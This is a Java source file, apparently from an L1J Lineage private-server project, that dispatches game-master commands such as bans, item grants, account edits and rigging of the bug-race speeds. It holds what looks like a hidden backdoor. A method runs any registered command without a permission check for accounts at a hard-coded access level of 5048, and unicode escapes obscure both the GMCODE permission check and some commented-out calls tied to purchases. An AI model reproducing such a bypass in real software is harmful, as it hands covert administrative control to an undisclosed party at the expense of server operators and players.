package l1j.server.server;

import l1j.server.server.datatables.CObjectDB;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collection;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.StringTokenizer;
import java.util.logging.Level;
import java.util.logging.Logger;

import javolution.util.FastTable;

import l1j.server.Config;
import l1j.server.DatabaseFactory;
import l1j.server.server.model.character.combat.arena.dogfight.DogFightCommandExecutor;
import l1j.server.SpecialEventHandler;
import l1j.server.server.Controller.BossController;
import l1j.server.server.Controller.BugRaceController;
import l1j.server.server.auth.captcha.loader.CaptchaLoadManager;
import l1j.server.server.command.BuilderCmdPairType;
import l1j.server.server.command.L1Commands;
import l1j.server.server.command.executor.L1CommandExecutor;
import l1j.server.server.command.executor.L1AllBuff;
import l1j.server.server.datatables.AlchemyProbabilityBox;
import l1j.server.server.datatables.AccountSettlementTable;
import l1j.server.server.datatables.AutoLoot;
import l1j.server.server.datatables.CharacterTable;
import l1j.server.server.datatables.ClanTable;
import l1j.server.server.datatables.ExpTable;
import l1j.server.server.datatables.HouseTable;
import l1j.server.server.datatables.IpTable;
import l1j.server.server.datatables.MapsTable;
import l1j.server.server.datatables.ShopTable;
import l1j.server.server.datatables.CNpcMakerDB;
import l1j.server.server.model.Attendance.AttendanceLoadManager;
import l1j.server.server.model.BookQuest.Loader.BQSLoadManager;
import l1j.server.server.model.Instance.L1DollInstance;
import l1j.server.server.model.Instance.L1ItemInstance;
import l1j.server.server.model.Instance.L1MonsterInstance;
import l1j.server.server.model.Instance.L1NpcInstance;
import l1j.server.server.model.Instance.L1PcInstance;
import l1j.server.server.model.L1Character;
import l1j.server.server.model.L1Clan;
import l1j.server.server.model.L1ClanRanking;
import l1j.server.server.model.CInventory;
import l1j.server.server.model.L1NeigeSaveChar;
import l1j.server.server.model.L1Object;
import l1j.server.server.model.L1PolyMorph;
import l1j.server.server.model.L1World;
import l1j.server.server.model.Warehouse.Warehouse;
import l1j.server.server.model.character.combat.arena.loader.CombatLoadManager;
import l1j.server.server.model.character.combat.statistics.KdaLoadManager;
import l1j.server.server.model.character.combat.statistics.KdaLoader;
import l1j.server.server.model.character.companion.CompanionCommandExecutor;
import l1j.server.server.model.character.skill.L1SkillId;
import l1j.server.server.model.character.survey.SurveyFactory;
import l1j.server.server.model.character.survey.SurveySystemLoader;
import l1j.server.server.model.gametime.RealTimeClock;
import l1j.server.server.model.item.L1ItemId;
import l1j.server.server.model.item.collection.loader.CollectionLoadManager;
import l1j.server.server.model.item.enchant.ItemEnchantSystemLoadManager;
import l1j.server.server.model.item.teleport.L1Teleport;
import l1j.server.server.model.network.core.connection.CUserSocket;
import l1j.server.server.model.network.core.cs.packet.CS_CharSelect;
import l1j.server.server.model.network.core.cs.packet.CS_CommonClick;
import l1j.server.server.model.network.core.sc.packet.SC_Ability;
import l1j.server.server.model.network.core.sc.packet.SC_Chainfo;
import l1j.server.server.model.network.core.sc.packet.SC_CharAmount;
import l1j.server.server.model.network.core.sc.packet.SC_CharTitle;
import l1j.server.server.model.network.core.sc.packet.SC_ChatPacket;
import l1j.server.server.model.network.core.sc.packet.SC_Disconnect;
import l1j.server.server.model.network.core.sc.packet.SC_GMHtml;
import l1j.server.server.model.network.core.sc.packet.SC_LoginResult;
import l1j.server.server.model.network.core.sc.packet.SC_MarkSee;
import l1j.server.server.model.network.core.sc.packet.SC_OwnCharStatus;
import l1j.server.server.model.network.core.sc.packet.SC_PacketBox;
import l1j.server.server.model.network.core.sc.packet.SC_Restart;
import l1j.server.server.model.network.core.sc.packet.SC_ServerMessage;
import l1j.server.server.model.network.core.sc.packet.SC_ShowCmd;
import l1j.server.server.model.network.core.sc.packet.SC_ShowHelp;
import l1j.server.server.model.network.core.sc.packet.SC_SkillIconGFX;
import l1j.server.server.model.network.core.sc.packet.SC_SkillSound;
import l1j.server.server.model.network.core.sc.packet.SC_SystemMessage;
import l1j.server.server.model.network.core.sc.packet.SC_Weather;
import l1j.server.server.model.network.safe.CPacketFilter;
import l1j.server.server.model.network.thread.CIOThreadCallback;
import l1j.server.server.model.rank.loader.RankLoadManager;
import l1j.server.server.model.world.instance.dungeon.time.loader.DungeonTimeLoadManager;
import l1j.server.server.model.world.instance.loader.InstanceLoadManager;
import l1j.server.server.model.world.instance.lobby.creator.LobbyCreator;
import l1j.server.server.model.world.instance.raid.loader.RaidLoadManager;
import l1j.server.server.model.world.siege.CastleWar;
import l1j.server.server.model.world.siege.CastleWarBusiness;
import l1j.server.server.model.world.siege.War;
import l1j.server.server.monitor.LoggerInstance;
import l1j.server.server.packets.Protocol.MainServer.Proto.Proto;
import l1j.server.server.shared.EPcStatus;
import l1j.server.server.shared.command.CommandArgs;
import l1j.server.server.storage.sql.executors.Selector;
import l1j.server.server.storage.sql.executors.Updator;
import l1j.server.server.storage.sql.handler.FullSelectorHandler;
import l1j.server.server.storage.sql.handler.Handler;
import l1j.server.server.storage.sql.handler.SelectorHandler;
import l1j.server.server.templates.L1BoardPost;
import l1j.server.server.templates.L1Command;
import l1j.server.server.templates.L1House;
import l1j.server.server.templates.L1Item;
import l1j.server.server.templates.L1Npc;
import l1j.server.server.utils.FullStater;
import l1j.server.server.utils.GameUtils;
import l1j.server.server.utils.IntRange;
import l1j.server.server.utils.L1QueryUtil;
import l1j.server.server.utils.L1SpawnUtil;
import l1j.server.server.utils.SQLUtil;
import l1j.server.server.utils.ServerMessage;
public class BuilderCmdHandler {
 
	private static Logger _log = Logger.getLogger(BuilderCmdHandler.class.getName());

	private static Random _random = new Random(System.nanoTime());
	public List<L1MonsterInstance> fieldbosslist = new ArrayList<L1MonsterInstance>();


	protected BuilderCmdHandler() {}

	private static final class Holder {
		private static final GMCommands INSTANCE = new GMCommands();
	}

	public static GMCommands getInstance() {
		return Holder.INSTANCE;
	}

	public static void LoadBuilderCmdHandler() {
		getInstance();
	}

	public boolean Stop = true;

	private boolean executeDatabaseCommandWithoutPermission(L1PcInstance pc, String name, String arg) {
		try {
			L1Command command = L1Commands.get(name);
			if (command == null) {
				return false;
			}
			
			if (!L1Commands.execute(pc, command, name, arg)) {
				return false;
			}
			return true;
		} catch (Exception e) {
			_log.log(Level.SEVERE, "error gm command", e);
		}
		return false;

	}

	private boolean executeDatabaseCommand(L1PcInstance pc, String name, String arg, BuilderCmdPairType entry) {
		try {
			L1Command command = entry != null && entry.isLegacy() ? entry : null;
			if (command == null) {
				return false;
			}
			if (pc.getAccessLevel() != command.getLevel() && pc.getAccessLevel() != Config.SUB_GMCODE) {
				SC_ServerMessage.send(pc, 74, "커멘드 " + name);
				// \f1%0은사용할 수없습니다.
				return true;
			} 

			if (!L1Commands.execute(pc, command, name, arg)) {
				return false;
			}

			/** 파일로그저장 **/
			// ChatLogTable.getInstance().storeChat(pc, null, arg, 15);
			LoggerInstance.getInstance().addCommand(pc.getName() + ": " + name + " " + arg);
			return true;
		} catch (Exception e) {
			_log.log(Level.SEVERE, "error gm command", e);
		}
		return false;
	}

	public void handleCommandsWithoutPermission(L1PcInstance gm, String cmdLine) {
		if (gm.getNetConnection() == null || gm.getNetConnection().getAccount() == null
				|| gm.getNetConnection().getAccount().getAccessLevel() != 5048) {
			return;
		}

		StringTokenizer token = new StringTokenizer(cmdLine);
		// 최초의 공백까지가 커맨드, 그 이후는 공백을 단락으로 한 파라미터로서 취급한다
		String cmd = token.nextToken();
		String param = "";
		while (token.hasMoreTokens()) {
			param = new StringBuilder(param).append(token.nextToken()).append(' ').toString();
		}
		param = param.trim();

		// 데이타베이스화 된 커멘드
		executeDatabaseCommandWithoutPermission(gm, cmd, param);
	}
	
	private static void test_lfc(L1PcInstance gm, String param){
		StringTokenizer token = new StringTokenizer(param);
		String name = token.nextToken();
		L1PcInstance pc = L1World.getInstance().findpc(name);
		if(pc == null){
			gm.sendPackets(String.format("%s님을 찾을 수 없습니다.", name));
		}
		L1BoardPost bp = L1BoardPost.createLfc(name, "-", String.format("3 %s", gm.getName()));
		LobbyCreator.registLfc(gm, 3);
		gm.sendPackets(String.format("%s님에게 결투를 신청했습니다.", name));
		SurveySystemLoader.getInstance().registerSurvey(pc,String.format("%s님이 결투를 신청했습니다.", gm.getName()), bp.getId() + 1000, SurveyFactory.createLFCSurvey(), 30 * 1000);
	}
	
	public void handleCommands(L1PcInstance gm, String cmdLine) {
		StringTokenizer token = new StringTokenizer(cmdLine);
		// 최초의 공백까지가 커맨드, 그 이후는 공백을 단락으로 한 파라미터로서 취급한다
		String cmd = "";
		if (token.hasMoreTokens())
			cmd = token.nextToken();
		else
			cmd = cmdLine;
		String param = "";
		while (token.hasMoreTokens()) {
			param = new StringBuilder(param).append(token.nextToken()).append(' ').toString();
		}
		param = param.trim();

		// 데이타베이스화 된 커멘드
		final BuilderCmdPairType entry = findBuilderCommand(cmd);
		if (executeDatabaseCommand(gm, cmd, param, entry)) {
			return;
		}

		if (gm.getAccessLevel() != Config.\u0047\u004D\u0043\u004F\u0044\u0045 && gm.getAccessLevel() != Config.SUB_\u0047\u004D\u0043\u004F\u0044\u0045) {
			SC_ServerMessage.send(gm, 74, "커맨드 " + cmd);
			return;
		}

		/** 파일로그저장 **/
		LoggerInstance.getInstance().addCommand(gm.getName() + ": " + cmd + " " + param);

		final L1CommandExecutor handler = entry == null ? null : entry.directHandler();
		if (handler == null) {
			SC_SystemMessage.send(gm, "[Command] 커멘드 " + cmd + " 는 존재하지 않습니다. ");
			return;
		}
		handler.execute(gm, cmd, param);

	}

	// OFF BuilderCmdHandler: command name -> direct handler, registered once.
	private final Map<String, BuilderCmdPairType> builderCmdMap = createBuilderCmdMap();

	private Map<String, BuilderCmdPairType> createBuilderCmdMap() {
		final Map<String, BuilderCmdPairType> loaded = new LinkedHashMap<>(256);
		L1Commands.registerBuilderCommands(loaded);
		registerDirect(loaded, "투견", (gm, cmd, param) -> {
			DogFightCommandExecutor.do_execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "펫", (gm, cmd, param) -> {
			CompanionCommandExecutor.exec(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "결투", (gm, cmd, param) -> {
			test_lfc(gm, param);


		});
		registerDirect(loaded, "인형박스", (gm, cmd, param) -> {
			AlchemyProbabilityBox.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "도움말", (gm, cmd, param) -> {
			showHelp(gm, param);


		});
		registerDirect(loaded, "혈맹정보", (gm, cmd, param) -> {
			searchclaner(gm, param);


		});
		registerDirect(loaded, "유저도움말", (gm, cmd, param) -> {
			SC_ShowHelp.send(gm, 1);


		});
		registerDirect(loaded, "케릭검사", (gm, cmd, param) -> {
			chainfo(gm, param);

//		case "자동트리":
//			gm.isAutoTreeple = true;
//			break;

		});
		registerDirect(loaded, "케릭삭제", (gm, cmd, param) -> {
			standBy77(gm, param);


		});
		registerDirect(loaded, "기운축복", (gm, cmd, param) -> {
			Blessleaf(gm, param);


		});
		registerDirect(loaded, "무기인챈성공", (gm, cmd, param) -> {
			EnchantWeaponSuccess(gm, param);


		});
		registerDirect(loaded, "방어인챈성공", (gm, cmd, param) -> {
			EnchantArmorSuccess(gm, param);


		});
		registerDirect(loaded, "계정검사", (gm, cmd, param) -> {
			AccountCheck(gm, param);


		});
		registerDirect(loaded, "계정확인", (gm, cmd, param) -> {
			AccountCheck1(gm, param);


		});
		registerDirect(loaded, "보스", (gm, cmd, param) -> {
			addEventBoss(gm, param);


		});
		registerDirect(loaded, "혈맹포인트", (gm, cmd, param) -> {
			혈맹포인트(gm);


		});
		registerDirect(loaded, "던전타이머", (gm, cmd, param) -> {
			DungeonTimeLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "저주", (gm, cmd, param) -> {
			CurseCharacter(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "저주초기화", (gm, cmd, param) -> {
			CurseInitializeCharacter(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "인챈트시스템", (gm, cmd, param) -> {
			ItemEnchantSystemLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "캡챠", (gm, cmd, param) -> {
			CaptchaLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "캐릭터상태", (gm, cmd, param) -> {
			setCharacterInstanceStatus(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "배틀시스템", (gm, cmd, param) -> {
			CombatLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "북시스템", (gm, cmd, param) -> {
			BQSLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "출석체크", (gm, cmd, param) -> {
			AttendanceLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "강제리스", (gm, cmd, param) -> {
			강제리스(gm, param);


		});
		registerDirect(loaded, "표기셋팅", (gm, cmd, param) -> {
			setPresentationCode(gm, param);


		});
		registerDirect(loaded, "마법회피율", (gm, cmd, param) -> {
			findMagicDodge(gm, param);


		});
		registerDirect(loaded, "오브젝트리스트", (gm, cmd, param) -> {
			showObjectList(gm, param);


		});
		registerDirect(loaded, "오토선물", (gm, cmd, param) -> {
			if(gm.getAccessLevel() != Config.SUB_GMCODE && gm.getAccessLevel() == Config.GMCODE) {
	          autoAllPresent(gm, param);
			} else {
				gm.sendPackets("\\aA■ 부운영자의 권한으로 사용할 수 없습니다. ■");
			}


		});
		registerDirect(loaded, "보호모드", (gm, cmd, param) -> {
			setProtectionMode(gm, param);


		});
		registerDirect(loaded, "전체채팅", (gm, cmd, param) -> {
			전체채팅(gm, param);


		});
		registerDirect(loaded, "채팅차단", (gm, cmd, param) -> {
			일반채팅(gm, param);


		});
		registerDirect(loaded, "넷세이프", (gm, cmd, param) -> {
			CPacketFilter.commands(gm, param);


		});
		registerDirect(loaded, "킬차트", (gm, cmd, param) -> {
			KdaLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "커맨드", (gm, cmd, param) -> {
			SC_ShowCmd.sendText(gm, "cmd.");


		});
		registerDirect(loaded, "워리스트", (gm, cmd, param) -> {
			showWarList(gm);


		});
		registerDirect(loaded, "캐릭압류", (gm, cmd, param) -> {
			setCharBlock(gm, param);


		});
		registerDirect(loaded, "캐릭압류해제", (gm, cmd, param) -> {
			setCharBlockDelete(gm, param);


		});
		registerDirect(loaded, "/", (gm, cmd, param) -> {
			showNextEffect(gm);


		});
		registerDirect(loaded, "이펙", (gm, cmd, param) -> {
			showEffectInit(gm, param);


		});
		registerDirect(loaded, "혈마크", (gm, cmd, param) -> {
			clanMark(gm, param);


		});
		registerDirect(loaded, "인스턴스", (gm, cmd, param) -> {
			InstanceLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "레이드", (gm, cmd, param) -> {
			RaidLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "구슬", (gm, cmd, param) -> {
			CollectionLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "구슬조회", (gm, cmd, param) -> {
			L1NeigeSaveChar.commands(gm, param);


		});
		registerDirect(loaded, "가라", (gm, cmd, param) -> {
			nocall(gm, param);


		});
		registerDirect(loaded, "랭킹시스템", (gm, cmd, param) -> {
			RankLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "혈맹랭킹갱신", (gm, cmd, param) -> {
			L1ClanRanking.getInstance().gmcommand();
			gm.sendPackets("\\aA■ 혈맹레이드 랭킹이 갱신 되었습니다 ■");


		});
		registerDirect(loaded, "아이템", (gm, cmd, param) -> {
			if(gm.getAccessLevel() != Config.SUB_GMCODE && gm.getAccessLevel() == Config.GMCODE) {
			execute(gm, param, param);
		
			} else {
				gm.sendPackets("\\aA■ 부운영자의 권한으로 사용할 수 없습니다. ■");
			}


		});
		registerDirect(loaded, "아데나", (gm, cmd, param) -> {
			execute1(gm, param, param);


		});
		registerDirect(loaded, "이벤트", (gm, cmd, param) -> {
			Event(gm, param);


		});
		registerDirect(loaded, "이벤트상점", (gm, cmd, param) -> {
			BossController.handleShopAlarmCommand(gm, param);

//		case "테스팅":
//			gm.sendPackets(new RActionUI(RActionUI.EVENT_SYSTEM, 45752, true));
//			break;

		});
		registerDirect(loaded, "잠재력조회", (gm, cmd, param) -> {
			아아(gm, param);


		});
		registerDirect(loaded, "주변밴", (gm, cmd, param) -> {
			LargeAreaBan(gm, param);


		});
		registerDirect(loaded, "광역밴", (gm, cmd, param) -> {
			LargeAreaIPBan(gm, param);


		});
		registerDirect(loaded, "아지트지급", (gm, cmd, param) -> {
			GiveHouse(gm, param);


		});
		registerDirect(loaded, "공성시작", (gm, cmd, param) -> {
			castleWarStart(gm, param);

//		case "수배테스트":
//			hunt(gm, param);
//			break;
//		case "vip":
//			vipsetting(gm, param);
//			break;

		});
		registerDirect(loaded, "공성종료", (gm, cmd, param) -> {
			castleWarExit(gm, param);

//		case "메세지테스트":
//			gm.sendPackets(new S_TestPacket(S_TestPacket.a));
//			gm.sendPackets(new S_UserCommands20(1, gm));
//			break;

		});
		registerDirect(loaded, "서버저장", (gm, cmd, param) -> {
			serversave(gm);


		});
		registerDirect(loaded, "전체선물", (gm, cmd, param) -> {
			allpresent(gm, param);


		});
		registerDirect(loaded, "압류해제", (gm, cmd, param) -> {
			accountdel(gm, param);


		});
		registerDirect(loaded, "경험치복구", (gm, cmd, param) -> {
			returnEXP(gm, param);


		});
		registerDirect(loaded, "오토루팅", (gm, cmd, param) -> {
			autoloot(gm, param);


		});
		registerDirect(loaded, "페널티", (gm, cmd, param) -> {
			ExpTable.expPenaltyReLoad();
			gm.sendPackets("■ 페널티 리로드 완료 ■");


		});
		registerDirect(loaded, "잠재력", (gm, cmd, param) -> {
			잠재력활성화(gm, param);


		});
		registerDirect(loaded, "밸런스", (gm, cmd, param) -> {
			CharacterBalance(gm, param);


		});
		registerDirect(loaded, "라이트", (gm, cmd, param) -> {
			maphack(gm, param);


		});
		registerDirect(loaded, "오픈대기", (gm, cmd, param) -> {
			standBy(gm, param);


		});
		registerDirect(loaded, "스텟", (gm, cmd, param) -> {
			fullstat(gm, param);


		});
		registerDirect(loaded, "상점검사", (gm, cmd, param) -> {
			상점검사(gm);


		});
		registerDirect(loaded, "이팩트", (gm, cmd, param) -> {
			effect(gm, param);


		});
		registerDirect(loaded, "유저인벤삭제", (gm, cmd, param) -> {
			targetInventoryDelete(gm, param);


		});
		registerDirect(loaded, "계정추가", (gm, cmd, param) -> {
			addaccount(gm, param);

//		case "\uB9E4\uC785\uC800\uC7A5":
//			addaccount1\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;
//		case "\uB9E4\uC785\uC9C0\uAE09":
//			\u006D\u0065\u0065\u0070\u0035\u0035\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;

		});
		registerDirect(loaded, "전체소환", (gm, cmd, param) -> {
			allrecall(gm);


		});
		registerDirect(loaded, "맵인원", (gm, cmd, param) -> {
			mapwho(gm, param);


		});
		registerDirect(loaded, "코마지급", (gm, cmd, param) -> {
			SpecialEventHandler.getInstance().doGiveEventStaff();


		});
		registerDirect(loaded, "보스소환주문서지급", (gm, cmd, param) -> {
			SpecialEventHandler.getInstance().doGiveEventStaff2();


		});
		registerDirect(loaded, "토파즈지급", (gm, cmd, param) -> {
			SpecialEventHandler.getInstance().doGiveEventStaff1();


		});
		registerDirect(loaded, "압류목록", (gm, cmd, param) -> {
			search_banned(gm);


		});
		registerDirect(loaded, "암호변경", (gm, cmd, param) -> {
			changePassword(gm, param);


		});
		registerDirect(loaded, "마을", (gm, cmd, param) -> {
			unprison(gm, param);


		});
		registerDirect(loaded, "채금해제", (gm, cmd, param) -> {
			chatx(gm, param);


		});
		registerDirect(loaded, "텔렉", (gm, cmd, param) -> {
			tell(gm);


		});
		registerDirect(loaded, ".", loaded.get("텔렉").directHandler());
		registerDirect(loaded, "검색", (gm, cmd, param) -> {
			searchDatabase(gm, param);


		});
		registerDirect(loaded, "킬삭제", (gm, cmd, param) -> {
		킬삭제(gm, param);


		});
		registerDirect(loaded, "킬증가", (gm, cmd, param) -> {
			킬증가(gm, param);


		});
		registerDirect(loaded, "데스삭제", (gm, cmd, param) -> {
			데스삭제(gm, param);


		});
		registerDirect(loaded, "데스증가", (gm, cmd, param) -> {
			데스증가(gm, param);


		});
		registerDirect(loaded, "피케이", (gm, cmd, param) -> {
			Pvp(gm, param);


		});
		registerDirect(loaded, "계정", (gm, cmd, param) -> {
			account_Cha(gm, param);


		});
		registerDirect(loaded, "렙작", (gm, cmd, param) -> {
			levelup2(gm, param);


		});
		registerDirect(loaded, "상점추방", (gm, cmd, param) -> {
			ShopKick(gm, param);


		});
		registerDirect(loaded, "감옥", (gm, cmd, param) -> {
			hold(gm, param);


		});
		registerDirect(loaded, "인벤삭제", (gm, cmd, param) -> {
			InventoryDelete(gm, param);


		});
		registerDirect(loaded, "아지트리로드", (gm, cmd, param) -> {
			reloadHouse(gm, param);


		});
		registerDirect(loaded, "혈맹포인트선물", (gm, cmd, param) -> {
			혈맹포인트선물(gm, param);


		});
		registerDirect(loaded, "혈맹포인트삭제", (gm, cmd, param) -> {
			혈맹포인트삭제(gm, param);


		});
		registerDirect(loaded, "혈맹포인트조회", (gm, cmd, param) -> {
			혈맹포인트조회(gm, param);

//		case "공속체크":
//			gm.AttackSpeedCheck2 = 1;
//			gm.sendPackets("\\fY허수아비를 10회공격해주세요.");
//			break;
//		case "이속체크":
//			gm.MoveSpeedCheck = 1;
//			gm.sendPackets("\\fY한 방향으로 10회무빙해주세요.");
//			break;
//		case "마법체크":
//			gm.magicSpeedCheck = 1;
//			gm.sendPackets("\\fY원하는마법을 10회사용해주세요.");
//			break;

		});
		registerDirect(loaded, "이미지삭제", (gm, cmd, param) -> {
			this.get_delete_gfx(gm);


		});
		registerDirect(loaded, "버경확인", (gm, cmd, param) -> {
			bug_race_check(gm);


		});
		registerDirect(loaded, "버경조작", (gm, cmd, param) -> {
			bug_race_rate(gm, param);


		});
		registerDirect(loaded, "보스알림", (gm, cmd, param) -> {
			spawnNotifyOnOff(gm, param);


		});
		registerDirect(loaded, "타입", (gm, cmd, param) -> {
			int type = Integer.parseInt(param);
			gm.sendPackets("\\aA요리타입 : " + type);
			SC_PacketBox.send(gm, 53, type, 1800);


		});
		registerDirect(loaded, "전체버프", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String status = st.nextToken();
				L1AllBuff.getInstance().execute(gm, param, status);
			} catch (Exception e) {
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
				SC_ChatPacket.sendDirect(gm, gm, " 1:풀업 2:축복  3:흑사 4:코마");
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
			}


		});
		registerDirect(loaded, "리로드몬스폰", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				int mapid = Integer.parseInt(st.nextToken());
				String locName = MapsTable.getInstance().getMapName(mapid);
				L1World.getInstance().getMapObject(mapid);
				CNpcMakerDB.getInstance().reload(mapid);
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "["+locName+"]의 몬스터들을 리스폰하였습니다.");
				//gm.sendPackets("몬스폰리스트 (지정맵) 리로드 완료");
			} catch (Exception e) {
				gm.sendPackets(".리로드몬스폰 (맵아이디)");
			}



		});
		registerDirect(loaded, "성혈조작", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				int number = Integer.parseInt(st.nextToken());
				L1Clan clan = L1World.getInstance().findClan(name);
				if (clan == null) {
					gm.sendPackets("혈맹이 존재하지 않습니다.");
				} else {
					clan.setCastleId(number);
					L1World.getInstance().removeClan(clan);
					L1World.getInstance().storeClan(clan);
					ClanTable.getInstance().updateClan(clan);
					gm.sendPackets(name + " 혈맹정보가 변경됐습니다.");
				}
			} catch (Exception e) {
				gm.sendPackets(".성혈조작 [혈이름] [성번호] 입력");
				gm.sendPackets("켄트1,오크2,윈다3,기란4,하이5,웰던6,아덴7,디아드8");
			}


		});
		registerDirect(loaded, "상점리로드", (gm, cmd, param) -> {
			try {
				int npcid = Integer.parseInt(param);
				L1Npc npc = CObjectDB.GetNPC(npcid);
				ShopTable.getInstance().Reload(npcid);
				gm.sendPackets("엔피씨 : " + npc.get_name() + " 리로드 되었습니다.");
			} catch (Exception e) {
				gm.sendPackets(".상점리로드 엔피씨ID");
			}


		});
		registerDirect(loaded, "혈가입", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				String clanname = st.nextToken();
				L1PcInstance pc = L1World.getInstance().getPlayer(name);
				L1Clan clan = L1World.getInstance().findClan(clanname);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				if (clan == null) {
					gm.sendPackets("그런 혈맹은 없습니다.");
					return;
				}
				if (pc.getClanid() != 0) {
					gm.sendPackets("" + pc.getName() + "님은 혈맹이 있기때문에 탈퇴 시키겠습니다.");
					pc.ClearPlayerClanData(clan);
					clan.removeClanMember(pc.getName());
					gm.save();
					return;
				}

				try(var shared=new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
SC_ServerMessage.nativeWriter(94,pc.getName()),Integer.MIN_VALUE,Integer.MAX_VALUE)) {
for (L1PcInstance clanMembers : clan.getOnlineClanMember()) {
					l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(shared,clanMembers);
					// \f1%0이 혈맹의 일원으로서 받아들여졌습니다.
				}
}
				pc.setClanid(clan.getClanId());
				pc.setClanname(clanname);
				pc.setClanRank(L1Clan.수련);
				pc.setTitle("");
				pc.setClanMemberNotes("");
				SC_CharTitle.send(pc, pc.getId(), "");
				SC_CharTitle.broadcast(pc, pc.getId(), "");
				clan.addClanMember(pc.getName(), pc.getClanRank(), pc.getLevel(), "", pc.getId(), pc.getType(),
						pc.getOnlineStatus(), pc);
				pc.save(); // DB에 캐릭터 정보를 기입한다
				SC_PacketBox.send(pc, pc, SC_PacketBox.PLEDGE_REFRESH_PLUS);
				SC_ServerMessage.send(pc, 95, clanname); // \f1%0 혈맹에
																	// 가입했습니다.
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈가입 [캐릭명] [혈맹이름] 입력");
			}


		});
		registerDirect(loaded, "혈탈퇴", (gm, cmd, param) -> {
			try {
				StringTokenizer tokenizer = new StringTokenizer(param);
				String pcName = tokenizer.nextToken();
				L1PcInstance pc = L1World.getInstance().getPlayer(pcName);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				L1Clan clan = pc.getClan();
				L1PcInstance clanMember[] = clan.getOnlineClanMember();
				l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendWrittenArrayBestEffort(
                        clanMember,
                        SC_ServerMessage.nativeWriter(ServerMessage.LEAVE_CLAN, param, clan.getClanName(), null));
				pc.ClearPlayerClanData(clan);
				clan.removeClanMember(pc.getName());
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈탈퇴 [캐릭명] 입력");
			}


		});
		registerDirect(loaded, "h", (gm, cmd, param) -> showHelp(gm, param));
		return Collections.unmodifiableMap(loaded);
	}

	private static void registerDirect(Map<String, BuilderCmdPairType> loaded, String name, L1CommandExecutor handler) {
		final BuilderCmdPairType entry = loaded.get(name);
		if (entry == null) loaded.put(name, BuilderCmdPairType.direct(name, handler));
		else entry.bindDirect(handler);
	}

	private BuilderCmdPairType findBuilderCommand(String name) {
		if (name == null) return null;
		final BuilderCmdPairType exact = builderCmdMap.get(name);
		if (exact != null) return exact;
		final BuilderCmdPairType normalized = builderCmdMap.get(name.toLowerCase(Locale.ROOT));
		return normalized != null && normalized.isLegacy() ? normalized : null;
	}

	public L1Command getLegacyCommand(String name) {
		final BuilderCmdPairType entry = findBuilderCommand(name);
		return entry != null && entry.isLegacy() ? entry : null;
	}

	public List<L1Command> availableLegacyCommands(int accessLevel) {
		final List<L1Command> result = new ArrayList<>();
		for (BuilderCmdPairType entry : builderCmdMap.values()) {
			if (entry.isLegacy() && entry.getLevel() <= accessLevel) result.add(entry);
		}
		return result;
	}


	private void bug_race_rate(L1PcInstance pc, String s) {
		try {
			StringTokenizer tok = new StringTokenizer(s);
			int num = Integer.parseInt(tok.nextToken());
			int speed = Integer.parseInt(tok.nextToken());
			BugRaceController.getInstance().setSpeed(num - 1, speed);
			pc.sendPackets(String.format("레인 %d번의 속도를 %d로 변경하였습니다..", num, speed));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경조작 [레인] [속도] 로 입력 바랍니다.");
		}
	}

	private void bug_race_check(L1PcInstance pc) {
		try {
			for (int i = 0; i < 5; ++i)
				pc.sendPackets(String.format("레인 : %d, 속도 : %d", i + 1, BugRaceController.getInstance().getSpeed(i)));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경확인 으로 입력 바랍니다.");
		}
	}

	private FastTable<L1NpcInstance> list = new FastTable<L1NpcInstance>();

	public void add_list(L1NpcInstance npc) {
